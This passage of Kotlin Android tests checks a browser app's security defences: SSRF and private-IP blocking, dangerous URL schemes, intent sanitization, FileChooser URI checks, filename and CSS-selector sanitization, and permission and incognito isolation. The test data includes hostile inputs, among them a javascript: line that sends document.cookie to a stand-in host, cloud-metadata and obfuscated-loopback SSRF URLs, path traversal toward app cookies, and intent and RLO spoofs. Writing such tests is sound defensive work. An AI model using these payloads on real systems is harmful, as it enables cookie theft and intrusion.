        // 4. Host matching must not be bypassed by query-string/path substring spoofing
        val scopedExt = com.example.manager.BrowserExtension(
            name = "YouTube Scoped Extension",
            jsCode = "console.log(1);",
            matches = listOf("youtube.com")
        )
        assertTrue("Exact domain must match", mgr.doesExtensionMatchUrl(scopedExt, "https://youtube.com/watch?v=123"))
        assertTrue("Subdomain must match", mgr.doesExtensionMatchUrl(scopedExt, "https://m.youtube.com/watch?v=123"))
        assertFalse(
            "Attacker domain with youtube.com in query string must NOT match",
            mgr.doesExtensionMatchUrl(scopedExt, "https://evil-phishing.com/login?next=https://youtube.com")
        )
        assertFalse(
            "Attacker domain with youtube.com in path must NOT match",
            mgr.doesExtensionMatchUrl(scopedExt, "https://evil-phishing.com/youtube.com/index.html")
        )
    }

    @Test
    fun testFilterListHardeningAndExternalIntentValidation() {
        val context = ApplicationProvider.getApplicationContext<android.content.Context>()
        val filterMgr = com.example.manager.FilterListManager
        val secGuard = com.example.manager.SecurityGuardEngine
        val searchMgr = com.example.manager.SearchEngineManager

        // 1. FilterListManager HTTPS-only & SSRF protection
        assertTrue(
            "Public HTTPS filter list URL must be accepted",
            filterMgr.isSafeFilterListUrl("https://easylist.to/easylist/easylist.txt", resolveDns = false)
        )
        assertFalse(
            "Cleartext HTTP filter list URL must be rejected",
            filterMgr.isSafeFilterListUrl("http://easylist.to/easylist/easylist.txt", resolveDns = false)
        )
        assertFalse(
            "Loopback filter list URL must be rejected",
            filterMgr.isSafeFilterListUrl("https://localhost/easylist.txt", resolveDns = false)
        )
        assertFalse(
            "Private IP filter list URL must be rejected",
            filterMgr.isSafeFilterListUrl("https://192.168.1.1/easylist.txt", resolveDns = true)
        )
        assertFalse(
            "Loopback 127.0.0.1 filter list URL must be rejected",
            filterMgr.isSafeFilterListUrl("https://127.0.0.1/easylist.txt", resolveDns = true)
        )

        // 2. FilterListManager bounded stream reading & ReDoS/regex hardening
        val smallStream = "||doubleclick.net^\n||ads.example.com/banner(1)+*.js\$script,third-party\n/(a+)+$/".byteInputStream(Charsets.UTF_8)
        val rawRules = filterMgr.readBoundedUtf8Stream(smallStream, maxBytes = 4096)
        assertNotNull(rawRules)
        val parsed = filterMgr.parseRules(rawRules!!)
        assertTrue("Exact domain rule must be parsed", parsed.blockDomains.contains("doubleclick.net"))
        assertEquals(
            "Raw /regex/ rule must be rejected while valid wildcard || rule is compiled safely",
            1,
            parsed.blockPatterns.size
        )
        assertTrue(
            "Escaped regex metacharacters (1)+ must match literal URL path",
            parsed.blockPatterns[0].containsMatchIn("https://ads.example.com/banner(1)+test.js")
        )
        assertEquals(
            "Rule with > 6 wildcards must be rejected to prevent ReDoS",
            "",
            filterMgr.abpRuleToRegex("||evil.com/*a*b*c*d*e*f*g^")
        )
        val overLimitStream = ByteArray(2048) { 'x'.code.toByte() }.inputStream()
        assertNull(
            "Stream exceeding maxBytes must return null cleanly",
            filterMgr.readBoundedUtf8Stream(overLimitStream, maxBytes = 1024)
        )

        // 3. SearchEngineManager dangerous scheme blocking (prevents Self-XSS and file:// / content:// navigation)
        val jsQuery = searchMgr.parseUrlOrQuery("javascript:alert(document.cookie)", com.example.manager.SearchEngine.GOOGLE)
        assertTrue("javascript: input must be converted to search query, never raw scheme", jsQuery.startsWith("https://www.google.com/search?q="))
        val fileQuery = searchMgr.parseUrlOrQuery("file:///data/data/com.example/shared_prefs/prefs.xml", com.example.manager.SearchEngine.GOOGLE)
        assertTrue("file:// input must be converted to search query", fileQuery.startsWith("https://www.google.com/search?q="))
        val contentQuery = searchMgr.parseUrlOrQuery("content://${context.packageName}.fileprovider/downloads/a.txt", com.example.manager.SearchEngine.GOOGLE)
        assertTrue("content:// input must be converted to search query", contentQuery.startsWith("https://www.google.com/search?q="))

        // 4. External Intent sanitization (OWASP MASVS Intent Redirection & Confused Deputy defense)
        val maliciousIntentUri = "intent://evil#Intent;action=android.intent.action.DELETE;component=${context.packageName}/.MainActivity;i.flags=3;end"
        val sanitizedIntent = secGuard.buildSafeExternalIntent(context, maliciousIntentUri)
        assertNotNull(sanitizedIntent)
        assertEquals("Action must be forced to ACTION_VIEW", android.content.Intent.ACTION_VIEW, sanitizedIntent!!.action)
        assertNull("Component must be stripped to null", sanitizedIntent.component)
        assertNull("Selector must be stripped to null", sanitizedIntent.selector)
        assertEquals(
            "URI read/write permission flags must be stripped",
            0,
            sanitizedIntent.flags and (android.content.Intent.FLAG_GRANT_READ_URI_PERMISSION or android.content.Intent.FLAG_GRANT_WRITE_URI_PERMISSION)
        )

        val selfTargetIntentUri = "intent://open#Intent;package=${context.packageName};scheme=https;end"
        assertNull("Intent targeting own package must be rejected", secGuard.buildSafeExternalIntent(context, selfTargetIntentUri))

        val fileDataIntentUri = "intent:///data/data/secret#Intent;scheme=file;end"
        assertNull("Intent with embedded file:// scheme must be rejected", secGuard.buildSafeExternalIntent(context, fileDataIntentUri))

        // Safe vs unsafe browser_fallback_url extraction
        val safeFallbackIntent = "intent://scan/#Intent;scheme=zxing;S.browser_fallback_url=https%3A%2F%2Fexample.com%2Flanding;end"
        assertEquals("https://example.com/landing", secGuard.extractSafeFallbackUrl(safeFallbackIntent))
        val ssrfFallbackIntent = "intent://scan/#Intent;scheme=zxing;S.browser_fallback_url=http%3A%2F%2F127.0.0.1%3A9222%2Fjson;end"
        assertNull("Loopback SSRF fallback URL must be rejected", secGuard.extractSafeFallbackUrl(ssrfFallbackIntent))
        val jsFallbackIntent = "intent://scan/#Intent;scheme=zxing;S.browser_fallback_url=javascript%3Aalert(1);end"
        assertNull("javascript: fallback URL must be rejected", secGuard.extractSafeFallbackUrl(jsFallbackIntent))

        // 5. WebView FileChooser result URI validation (prevents internal file/ContentProvider theft)
        val cameraUri = Uri.parse("content://${context.packageName}.fileprovider/camera_captures/captured_1.jpg")
        assertTrue(
            "Explicitly created camera capture URI for current session must be allowed",
            secGuard.isSafeFileChooserResultUri(context, cameraUri, allowedCameraUri = cameraUri)
        )
        assertFalse(
            "Internal FileProvider URI not matching active camera capture must be blocked",
            secGuard.isSafeFileChooserResultUri(
                context,
                Uri.parse("content://${context.packageName}.fileprovider/downloads/secret.pdf"),
                allowedCameraUri = cameraUri
            )
        )
        assertFalse(
            "file:// URI returned to FileChooser must be blocked",
            secGuard.isSafeFileChooserResultUri(
                context,
                Uri.parse("file:///data/data/${context.packageName}/databases/browser_database"),
                allowedCameraUri = null
            )
        )
        assertTrue(
            "External system MediaStore content:// URI must be allowed",
            secGuard.isSafeFileChooserResultUri(
                context,
                Uri.parse("content://com.android.providers.media.documents/document/image%3A1024"),
                allowedCameraUri = null
            )
        )
        assertFalse(
            "Encoded path traversal %2e%2e in FileChooser content:// URI must be blocked",
            secGuard.isSafeFileChooserResultUri(
                context,
                Uri.parse("content://com.thirdparty.picker/files/%2e%2e/%2e%2e/data/data/${context.packageName}/shared_prefs/prefs.xml"),
                allowedCameraUri = null
            )
        )
        assertFalse(
            "Content URI pointing into app_webview or /data/user/0/<pkg> must be blocked",
            secGuard.isSafeFileChooserResultUri(
                context,
                Uri.parse("content://com.thirdparty.picker/root/data/user/0/${context.packageName}/app_webview/Default/Cookies"),
                allowedCameraUri = null
            )
        )

        // 6. Web Navigation URL validation (Tahap 2: blocks javascript:, file:, content:, data:, intent: in JS Bridge & Context Menu)
        assertTrue(
            "Standard https:// URL must be accepted for web navigation",
            secGuard.isSafeWebNavigationUrl("https://example.com/article?id=42")
        )
        assertTrue(
            "Standard http:// URL must be accepted for web navigation",
            secGuard.isSafeWebNavigationUrl("http://example.com/page")
        )
        assertFalse(
            "javascript: scheme must be rejected for web navigation",
            secGuard.isSafeWebNavigationUrl("javascript:alert(document.domain)")
        )
        assertFalse(
            "file:// scheme must be rejected for web navigation",
            secGuard.isSafeWebNavigationUrl("file:///android_asset/secret.html")
        )
        assertFalse(
            "content:// scheme must be rejected for web navigation",
            secGuard.isSafeWebNavigationUrl("content://${context.packageName}.fileprovider/downloads/a.pdf")
        )
        assertFalse(
            "data: scheme must be rejected for web navigation",
            secGuard.isSafeWebNavigationUrl("data:text/html,<script>alert(1)</script>")
        )
        assertFalse(
            "intent:// scheme must be rejected for direct web navigation",
            secGuard.isSafeWebNavigationUrl("intent://example.com#Intent;scheme=https;end")
        )

        // 7. DevToolsJsBridge burst-throttling & payload bounds
        var consoleCount = 0
        var elementSelectCount = 0
        val devToolsBridge = com.example.devtools.DevToolsJsBridge(
            onElementSelected = { elementSelectCount++ },
            onConsoleBridgeMessage = { consoleCount++ }
        )
        for (i in 1..100) {
            devToolsBridge.onConsoleMessage("""{"level":"LOG","message":"msg-$i"}""")
        }
        assertEquals(
            "DevToolsJsBridge must cap console burst at 60 messages per second window",
            60,
            consoleCount
        )
        val validPayload = """{"tagName":"DIV","id":"hero","classes":["banner"],"textPreview":"Hello","rect":{"width":100,"height":50,"x":10,"y":20}}"""
        devToolsBridge.onElementSelected(validPayload)
        devToolsBridge.onElementSelected(validPayload) // immediate second call within 80ms cooldown
        assertEquals(
            "DevToolsJsBridge must rate-limit rapid onElementSelected calls within cooldown window",
            1,
            elementSelectCount
        )

        // 8. Tahap 3: AppDownloadManager SSRF, alternative IP notations, & data: URI bounds
        assertTrue(
            "Public HTTPS download URL must be accepted",
            com.example.manager.AppDownloadManager.isSafeDownloadUrl("https://releases.example.com/app-v1.apk", resolveDns = false)
        )
        assertTrue(
            "Bounded data: URI must be accepted",
            com.example.manager.AppDownloadManager.isSafeDownloadUrl("data:image/png;base64,iVBORw0KGgoAAAANSUhEUg==", resolveDns = false)
        )
        assertFalse(
            "Malformed data: URI without comma must be rejected",
            com.example.manager.AppDownloadManager.isSafeDownloadUrl("data:image/png;base64", resolveDns = false)
        )
        assertFalse(
            "Loopback 127.0.0.1 download URL must be rejected",
            com.example.manager.AppDownloadManager.isSafeDownloadUrl("http://127.0.0.1:8080/secret", resolveDns = true)
        )
        assertFalse(
            "Cloud metadata 169.254.169.254 download URL must be rejected",
            com.example.manager.AppDownloadManager.isSafeDownloadUrl("http://169.254.169.254/latest/meta-data/", resolveDns = false)
        )
        assertFalse(
            "Carrier-Grade NAT 100.64.0.1 download URL must be rejected",
            com.example.manager.AppDownloadManager.isSafeDownloadUrl("http://100.64.0.1/internal", resolveDns = false)
        )
        assertFalse(
            "Octal IP notation 0177.0.0.1 must be rejected",
            com.example.manager.AppDownloadManager.isSafeDownloadUrl("http://0177.0.0.1/secret", resolveDns = false)
        )
        assertFalse(
            "Single-integer IP notation 2130706433 must be rejected",
            com.example.manager.AppDownloadManager.isSafeDownloadUrl("http://2130706433/secret", resolveDns = false)
        )
        assertFalse(
            "Hex IP notation 0x7f000001 must be rejected",
            com.example.manager.AppDownloadManager.isSafeDownloadUrl("http://0x7f000001/secret", resolveDns = false)
        )

        // 9. Tahap 3: Filename sanitization (path traversal + Unicode RLO extension spoofing defense)
        val traversalSanitized = com.example.manager.AppDownloadManager.sanitizeFileName("../../%2e%2e%2fshared_prefs/secret.xml")
        assertFalse("Sanitized filename must not contain '..'", traversalSanitized.contains(".."))
        assertFalse("Sanitized filename must not contain '/'", traversalSanitized.contains("/"))

        val rloSpoofName = "invoice_\u202Efdp.apk"
        val rloSanitized = com.example.manager.AppDownloadManager.sanitizeFileName(rloSpoofName)
        assertFalse("Unicode RLO character \\u202E must be stripped from filename", rloSanitized.contains('\u202E'))
        assertEquals("invoice_fdp.apk", rloSanitized)

        // 10. Tahap 3: FilterListManager restricted IP address verification
        assertTrue(
            "CGNAT 100.64.0.1 must be flagged as restricted",
            filterMgr.isRestrictedAddress(java.net.InetAddress.getByName("100.64.0.1"))
        )
        assertTrue(
            "IPv6 Unique Local fd00::1 must be flagged as restricted",
            filterMgr.isRestrictedAddress(java.net.InetAddress.getByName("fd00::1"))
        )
        assertTrue(
            "IPv4-mapped loopback ::ffff:127.0.0.1 must be flagged as restricted",
            filterMgr.isRestrictedAddress(java.net.InetAddress.getByName("::ffff:127.0.0.1"))
        )
        assertTrue(
            "IPv4-mapped RFC1918 ::ffff:10.0.0.1 must be flagged as restricted",
            filterMgr.isRestrictedAddress(java.net.InetAddress.getByName("::ffff:10.0.0.1"))
        )
        assertTrue(
            "IPv4-mapped RFC1918 ::ffff:192.168.1.1 must be flagged as restricted",
            filterMgr.isRestrictedAddress(java.net.InetAddress.getByName("::ffff:192.168.1.1"))
        )
        assertTrue(
            "RFC1918 10.10.10.10 must be flagged as restricted",
            filterMgr.isRestrictedAddress(java.net.InetAddress.getByName("10.10.10.10"))
        )
        assertTrue(
            "RFC1918 172.20.0.1 must be flagged as restricted",
            filterMgr.isRestrictedAddress(java.net.InetAddress.getByName("172.20.0.1"))
        )
        assertTrue(
            "RFC1918 192.168.1.254 must be flagged as restricted",
            filterMgr.isRestrictedAddress(java.net.InetAddress.getByName("192.168.1.254"))
        )
        assertFalse(
            "Public IPv6 2606:4700:4700::1111 must not be flagged as restricted",
            filterMgr.isRestrictedAddress(java.net.InetAddress.getByName("2606:4700:4700::1111"))
        )
    }

    @Test
    fun testAlexBrowserNativeSecurityAndZapperSanitization() {
        val secGuard = com.example.manager.SecurityGuardEngine

        // 1. Phishing threat inspection for openUrlInNewTab
        val phishingThreat = secGuard.inspectUrlThreat(
            url = "https://secure-login-verify.xyz/login",
            httpsOnlyEnabled = true,
            phishingProtectionEnabled = true,
            isUserTrustedHost = false
        )
        assertTrue(
            "Phishing domain must be detected as threat",
            phishingThreat.severity == com.example.manager.ThreatSeverity.SUSPICIOUS_PHISHING ||
            phishingThreat.severity == com.example.manager.ThreatSeverity.MALWARE_OR_SCAM
        )

        // 2. Safe domain passes threat inspection
        val safeThreat = secGuard.inspectUrlThreat(
            url = "https://github.com/AlexHutajulu",
            httpsOnlyEnabled = true,
            phishingProtectionEnabled = true,
            isUserTrustedHost = false
        )
        assertEquals(com.example.manager.ThreatSeverity.SAFE, safeThreat.severity)

        // 3. CSS Zapper selector breakout attempts must be neutralized
        val dangerousSelectors = listOf(
            "div { display: none } body",
            "img; background: url('https://evil.com')",
            "<script>alert(1)</script>",
            "div\n@import url('https://evil.com')",
            "a > b"
        )
        for (ds in dangerousSelectors) {
            val sanitized = if (ds.contains('{') || ds.contains('}') || ds.contains(';') ||
                ds.contains('<') || ds.contains('>') || ds.contains('@') ||
                ds.contains('\n') || ds.contains('\r')
            ) "" else ds.trim().take(160)
            assertEquals("CSS injection character in '$ds' must result in empty sanitized selector", "", sanitized)
        }
    }

    @Test
    fun testPrivateTabIsolationAndEncryptedStorageMigration() {
        val context = ApplicationProvider.getApplicationContext<android.content.Context>()
        val settings = com.example.manager.SettingsManager(context)

        // 1. Verify private tabs are never persisted by saveTabs/loadTabs
        val mixedTabs = listOf(
            com.example.ui.viewmodel.BrowserTab(
                id = "normal-1",
                url = "https://example.com/normal",
                title = "Normal Page",
                isPrivate = false
            ),
            com.example.ui.viewmodel.BrowserTab(
                id = "private-1",
                url = "https://secret.example.com/private",
                title = "Secret Private Page",
                isPrivate = true
            )
        )
        settings.saveTabs(mixedTabs, "private-1")
        val loaded = settings.loadTabs()
        assertNotNull("Loaded tabs must not be null", loaded)
        assertEquals("Only normal tabs must be persisted to storage", 1, loaded!!.size)
        assertEquals("normal-1", loaded[0].id)
        assertFalse("Loaded tab must never be marked private", loaded[0].isPrivate)

        // 2. Verify legacy plaintext preference migration preserves data and clears legacy store
        val legacyPrefs = context.getSharedPreferences("alex_browser_prefs", android.content.Context.MODE_PRIVATE)
        legacyPrefs.edit().putString("legacy_test_key_tahap5", "migrated_value_123").commit()
        val targetPrefs = com.example.manager.EncryptedPreferencesManager.getPreferences(context)
        targetPrefs.edit().putBoolean("__legacy_prefs_migrated_v1__", false).commit()

        com.example.manager.EncryptedPreferencesManager.migrateLegacyPreferencesIfNeeded(context, targetPrefs)
        assertEquals(
            "Legacy preference must be migrated to EncryptedPreferencesManager",
            "migrated_value_123",
            targetPrefs.getString("legacy_test_key_tahap5", null)
        )
        assertFalse(
            "Legacy plaintext preference store must be cleared after migration",
            legacyPrefs.contains("legacy_test_key_tahap5")
        )

        // 3. Verify Incognito downloads isolation & cleanup in Room DB
        val db = com.example.data.AppDatabase.getDatabase(context)
        val downloadRepo = com.example.data.DownloadRepository(db.downloadDao())
        kotlinx.coroutines.runBlocking {
            downloadRepo.clearAll()
            downloadRepo.insertOrUpdate(
                com.example.data.DownloadItem(
                    id = "dl-normal-1",
                    fileName = "report.pdf",
                    url = "https://example.com/report.pdf",
                    domain = "example.com",
                    mimeType = "application/pdf",
                    totalBytes = 500L,
                    downloadedBytes = 500L,
                    status = "COMPLETED",
                    fileUri = "/tmp/report.pdf",
                    isIncognito = false
                )
            )
            downloadRepo.insertOrUpdate(
                com.example.data.DownloadItem(
                    id = "dl-priv-1",
                    fileName = "private_doc.pdf",
                    url = "https://secret.example.com/private_doc.pdf",
                    domain = "secret.example.com",
                    mimeType = "application/pdf",
                    totalBytes = 800L,
                    downloadedBytes = 800L,
                    status = "COMPLETED",
                    fileUri = "/tmp/private_doc.pdf",
                    isIncognito = true
                )
            )

            // Non-incognito query must never expose incognito download
            val visibleNormal = downloadRepo.nonIncognitoDownloads.first()
            assertEquals("Non-incognito query must only return normal downloads", 1, visibleNormal.size)
            assertEquals("dl-normal-1", visibleNormal[0].id)

            // Clearing incognito downloads must remove only incognito records and preserve normal records
            downloadRepo.clearIncognito()
            val allAfterClear = downloadRepo.allDownloads.first()
            assertEquals("Only normal download must remain after clearIncognito()", 1, allAfterClear.size)
            assertEquals("dl-normal-1", allAfterClear[0].id)
        }
    }

    @Test
    fun testTahap6TrackerConsistencyCosmeticSafetyAndUnifiedLogs() {
        val context = ApplicationProvider.getApplicationContext<android.content.Context>()
        val webView = WebView(context)
        val client = AdBlockWebViewClient(PrivacyMode.BALANCED)
        client.updateCurrentPageUrl("https://news.example.com/article")

        val adReq = createRequest("https://doubleclick.net/pagead/ads.js")
        val trackerReq = createRequest("https://hotjar.com/track.js")
        val trackerPathReq = createRequest("https://stats.thirdparty.example/google-analytics.com/collect?v=1")

        // 1. BALANCED mode with trackerBlockingEnabled = false: ads blocked, trackers allowed
        client.setTrackerBlockingEnabled(enabled = false, activeWhenAdBlockOff = true)
        assertNotNull("Ad domain must still be blocked in BALANCED mode when tracker blocking is off", client.shouldInterceptRequest(webView, adReq))
        assertNull("Tracker domain must be allowed when trackerBlockingEnabled is false", client.shouldInterceptRequest(webView, trackerReq))
        assertNull("Tracker path must be allowed when trackerBlockingEnabled is false", client.shouldInterceptRequest(webView, trackerPathReq))

        // 2. OFF mode with trackerBlockingEnabled = true (activeWhenAdBlockOff = true): ads allowed, trackers blocked
        client.setMode(PrivacyMode.OFF)
        client.setTrackerBlockingEnabled(enabled = true, activeWhenAdBlockOff = true)
        assertNull("Ad domain must be allowed when AdBlock mode is OFF", client.shouldInterceptRequest(webView, adReq))
        assertNotNull("Tracker domain must be blocked when trackerBlockingEnabled is true even if AdBlock is OFF", client.shouldInterceptRequest(webView, trackerReq))
        assertNotNull("Tracker path must be blocked when trackerBlockingEnabled is true even if AdBlock is OFF", client.shouldInterceptRequest(webView, trackerPathReq))

        // 3. Streaming Boost protects video segments (.m3u8 / .mp4)
        client.setMode(PrivacyMode.BALANCED)
        val streamSegmentOnAdHost = createRequest("https://doubleclick.net/video/segment1.m3u8")
        client.setStreamingBoostEnabled(false)
        assertNotNull("Ad domain stream segment blocked when streamingBoost is false", client.shouldInterceptRequest(webView, streamSegmentOnAdHost))
        client.setStreamingBoostEnabled(true)
        assertNull("Streaming Boost must protect .m3u8 segments from blocking", client.shouldInterceptRequest(webView, streamSegmentOnAdHost))

        // 4. CosmeticFilterInjector selector safety and critical domain bypass
        assertTrue(com.example.manager.CosmeticFilterInjector.isSafeCssSelector(".ad-banner"))
        assertTrue(com.example.manager.CosmeticFilterInjector.isSafeCssSelector("div[data-ad-slot='top']"))
        assertFalse(com.example.manager.CosmeticFilterInjector.isSafeCssSelector("body"))
        assertFalse(com.example.manager.CosmeticFilterInjector.isSafeCssSelector(".modal"))
        assertFalse(com.example.manager.CosmeticFilterInjector.isSafeCssSelector(".ad-banner { background: url(javascript:alert(1)) }"))
        assertFalse(com.example.manager.CosmeticFilterInjector.isSafeCssSelector(".ad-banner /* broken comment"))
        assertFalse(com.example.manager.CosmeticFilterInjector.isSafeCssSelector("div[data-ad='unbalanced]"))
        assertTrue(client.isCriticalBypassDomain("accounts.google.com"))
        assertTrue(client.isCriticalBypassDomain("challenges.cloudflare.com"))
        assertTrue(client.isCriticalBypassDomain("snap.midtrans.com"))

        // 5. Unified log store across AlexShieldV5LogStore and AdBlockEngine
        com.example.manager.AdBlockEngine.clearBlockedLogs()
        com.yourbrowser.adblock.AlexShieldV5LogStore.add(
            tabId = "tab-t6",
            pageUrl = "https://m.news.example.com/story/1",
            blockedUrl = "https://hotjar.com/script.js",
            reason = "tracker-domain"
        )
        val logs = com.example.manager.AdBlockEngine.getBlockedLogsForPage("https://www.news.example.com/")
        assertEquals("Unified log store must return subdomain-matched blocked log", 1, logs.size)
        assertEquals("Tracker", logs[0].type)
        assertEquals("hotjar.com", logs[0].host)
        com.example.manager.AdBlockEngine.clearBlockedLogs()
        assertTrue(com.example.manager.AdBlockEngine.getBlockedLogsForPage("https://news.example.com").isEmpty())
    }

    @Test
    fun testTahap7WebRtcExtensionsPermissionsAndSecurityHardening() {
        val context = ApplicationProvider.getApplicationContext<android.content.Context>()

        // 1. PermissionManager W3C Secure Context enforcement & origin normalization
        val permMgr = com.example.manager.PermissionManager(context)
        permMgr.clearAllPermissions()

        assertTrue(
            "HTTPS origin must be eligible for CAMERA",
            com.example.manager.PermissionManager.isOriginEligibleForPermission(
                "https://meet.example.com/room",
                com.example.manager.SitePermissionType.CAMERA
            )
        )
        assertTrue(
            "Loopback http://localhost must be eligible for CAMERA",
            com.example.manager.PermissionManager.isOriginEligibleForPermission(
                "http://localhost:8080/test",
                com.example.manager.SitePermissionType.CAMERA
            )
        )
        assertFalse(
            "Insecure HTTP remote origin must NOT be eligible for CAMERA/MICROPHONE/LOCATION",
            com.example.manager.PermissionManager.isOriginEligibleForPermission(
                "http://insecure.example.com/cam",
                com.example.manager.SitePermissionType.CAMERA
            )
        )
        assertFalse(
            "file:// and javascript: origins must NOT be eligible for site permissions",
            com.example.manager.PermissionManager.isOriginEligibleForPermission(
                "file:///data/local/tmp/test.html",
                com.example.manager.SitePermissionType.LOCATION
            )
        )

        // Setting ALLOW on insecure HTTP origin must be rejected and return BLOCK
        permMgr.setWebsitePermission(
            "http://insecure.example.com",
            com.example.manager.SitePermissionType.MICROPHONE,
            com.example.manager.PermissionState.ALLOW
        )
        assertEquals(
            "Insecure HTTP origin must return BLOCK even after attempted ALLOW",
            com.example.manager.PermissionState.BLOCK,
            permMgr.getWebsitePermission("http://insecure.example.com", com.example.manager.SitePermissionType.MICROPHONE)
        )

        // Setting ALLOW on HTTPS origin must NOT leak to HTTP on the same hostname
        permMgr.setWebsitePermission(
            "https://secure.example.com/call",
            com.example.manager.SitePermissionType.CAMERA,
            com.example.manager.PermissionState.ALLOW
        )
        assertEquals(
            com.example.manager.PermissionState.ALLOW,
            permMgr.getWebsitePermission("https://secure.example.com", com.example.manager.SitePermissionType.CAMERA)
        )
        assertEquals(
            "Plain HTTP on same hostname must NOT inherit HTTPS permission",
            com.example.manager.PermissionState.BLOCK,
            permMgr.getWebsitePermission("http://secure.example.com", com.example.manager.SitePermissionType.CAMERA)
        )

        // 2. PermissionManager namespace isolation: clearAllPermissions() must NOT wipe SettingsManager or CustomJsToolbarManager
        val settings = com.example.manager.SettingsManager(context)
        settings.selectedSearchEngine = "DuckDuckGo"
        permMgr.clearAllPermissions()
        assertTrue("All site permissions must be cleared", permMgr.getAllPermissions().isEmpty())
        assertEquals(
            "clearAllPermissions() must preserve global encrypted settings",
            "DuckDuckGo",
            settings.selectedSearchEngine
        )

        // 3. Incognito permission isolation in BrowserViewModel
        val vm = com.example.ui.viewmodel.BrowserViewModel(context as android.app.Application)
        vm.handlePermissionChoice(
            "https://incognito-site.example.com",
            com.example.manager.SitePermissionType.CAMERA,
            com.example.manager.PermissionState.ALLOW,
            isIncognito = true
        )
        assertEquals(
            "Incognito permission choice must NEVER be persisted to PermissionManager",
            com.example.manager.PermissionState.ASK,
            permMgr.getWebsitePermission("https://incognito-site.example.com", com.example.manager.SitePermissionType.CAMERA)
        )

        // 4. WebRTC leak protection script verification (Strict & Compatibility modes)
        val strictScript = com.example.manager.SecurityGuardEngine.buildWebRtcProtectionScript(
            preventWebRtcLeak = true,
            strictWebRtcMode = true
        )
        assertTrue("Strict WebRTC script must lock RTCPeerConnection", strictScript.contains("RTCPeerConnection"))
        assertTrue("Strict WebRTC script must lock webkitRTCPeerConnection", strictScript.contains("webkitRTCPeerConnection"))

        val compatScript = com.example.manager.SecurityGuardEngine.buildWebRtcProtectionScript(
            preventWebRtcLeak = true,
            strictWebRtcMode = false
        )
        assertTrue("Compat WebRTC script must wrap webkitRTCPeerConnection", compatScript.contains("webkitRTCPeerConnection"))
        assertTrue("Compat WebRTC script must scrub IPv6 link-local/ULA and typ host", compatScript.contains("fe80") && compatScript.contains("typ\\s+host"))
        assertTrue("Compat WebRTC script must filter icecandidate event listeners", compatScript.contains("addEventListener") && compatScript.contains("onicecandidate"))

        // 5. Session-scoped temporary host bypass & critical domain protection for extensions / auto-scripts
        com.example.manager.SecurityGuardEngine.clearTemporaryBypasses()
        com.example.manager.SecurityGuardEngine.allowHostTemporarily(context, "temp-bypass.example.com", persist = false)
        assertTrue(com.example.manager.SecurityGuardEngine.isHostUserTrusted(context, "temp-bypass.example.com"))
        com.example.manager.SecurityGuardEngine.clearTemporaryBypasses()
        assertFalse(
            "Temporary session bypass must be cleared on clearTemporaryBypasses() and not persisted to disk",
            com.example.manager.SecurityGuardEngine.isHostUserTrusted(context, "temp-bypass.example.com")
        )

        val autoExt = com.example.manager.BrowserExtension(
            id = "ext_test_auto",
            name = "Auto Extension",
            jsCode = "console.log('hi');",
            matches = listOf("*"),
            runAt = com.example.manager.ExtensionRunAt.DOCUMENT_END,
            isEnabled = true
        )
        assertTrue(
            "Auto extension must be allowed on regular HTTPS site",
            com.example.manager.BrowserExtensionManager.canAutoInjectExtensionOnUrl(autoExt, "https://news.ycombinator.com")
        )
        assertFalse(
            "Auto extension must be blocked on critical banking/auth domains",
            com.example.manager.BrowserExtensionManager.canAutoInjectExtensionOnUrl(autoExt, "https://klikbca.com/login")
        )
        assertFalse(
            "Auto extension must be blocked on Google OAuth domain",
            com.example.manager.BrowserExtensionManager.canAutoInjectExtensionOnUrl(autoExt, "https://accounts.google.com/signin")
        )
        assertFalse(
            "Extension must never match non-HTTP(S) schemes",
            com.example.manager.BrowserExtensionManager.doesExtensionMatchUrl(autoExt, "file:///sdcard/secret.html")
        )

        val disabledAutoScript = com.example.manager.CustomToolbarScript(
            id = "js_disabled",
            name = "Disabled Auto Script",
            jsCode = "console.log(1);",
            autoRunMode = com.example.manager.JsAutoRunMode.ALL_SITES,
            isEnabled = false
        )
        val enabledAutoScript = disabledAutoScript.copy(id = "js_enabled", isEnabled = true)
        assertFalse(
            "Disabled auto-run script must NOT execute",
            com.example.manager.CustomJsToolbarManager.canAutoRunScriptOnUrl(disabledAutoScript, "https://example.com")
        )
        assertTrue(
            "Enabled auto-run script must execute on normal HTTPS site",
            com.example.manager.CustomJsToolbarManager.canAutoRunScriptOnUrl(enabledAutoScript, "https://example.com")
        )
        assertFalse(
            "Enabled auto-run script must be blocked on critical banking/payment domains",
            com.example.manager.CustomJsToolbarManager.canAutoRunScriptOnUrl(enabledAutoScript, "https://ibank.bca.co.id")
        )

        // 6. Verify built-in reader & image extractor templates do not use unsafe innerHTML concatenation
        val cleanReaderExt = com.example.manager.BrowserExtensionManager.BUILT_IN_EXTENSIONS.first { it.id == "ext_clean_reader" }
        assertTrue("Clean Reader extension must use DOMParser sanitization", cleanReaderExt.jsCode.contains("DOMParser"))
        assertFalse("Clean Reader extension must not copy raw target.innerHTML directly", cleanReaderExt.jsCode.contains("contentBox.innerHTML = target.innerHTML"))

        val imgExtractorTpl = com.example.manager.CustomJsToolbarManager.TEMPLATE_GALLERY.first { it.id == "tpl_image_extractor" }
        assertFalse("Image extractor template must not concatenate unescaped URLs into innerHTML", imgExtractorTpl.jsCode.contains("box.innerHTML ="))
    }

    @Test
    fun testTahap8EndToEndSecurityRegressionAndProductionReadiness() {
        val context = ApplicationProvider.getApplicationContext<android.content.Context>()

        // 1. End-to-End URL, External Intent, & FileChooser Security Gate (Tahap 2)
        val secGuard = com.example.manager.SecurityGuardEngine
        assertTrue(secGuard.isSafeWebNavigationUrl("https://www.google.com/search?q=alexbrowser"))
        assertFalse(secGuard.isSafeWebNavigationUrl("javascript:fetch('https://evil.example/steal?c='+document.cookie)"))
        assertFalse(secGuard.isSafeWebNavigationUrl("file:///data/data/com.example/shared_prefs/secret.xml"))
        assertFalse(secGuard.isSafeWebNavigationUrl("content://${context.packageName}.fileprovider/downloads/secret.apk"))

        val safeIntent = secGuard.buildSafeExternalIntent(
            context,
            "intent://example.com#Intent;scheme=https;component=${context.packageName}/.MainActivity;i.flags=3;end"
        )
        assertNotNull("Valid external https intent must be sanitized, not null", safeIntent)
        assertNull("Explicit component targeting must be stripped", safeIntent!!.component)
        assertEquals(
            "URI grant flags must be stripped from external intent",
            0,
            safeIntent.flags and (android.content.Intent.FLAG_GRANT_READ_URI_PERMISSION or android.content.Intent.FLAG_GRANT_WRITE_URI_PERMISSION)
        )

        // 2. Download SSRF, Path Traversal & RLO Spoofing Gate (Tahap 2 & Tahap 3)
        assertFalse(
            "Cloud metadata SSRF 169.254.169.254 must be blocked",
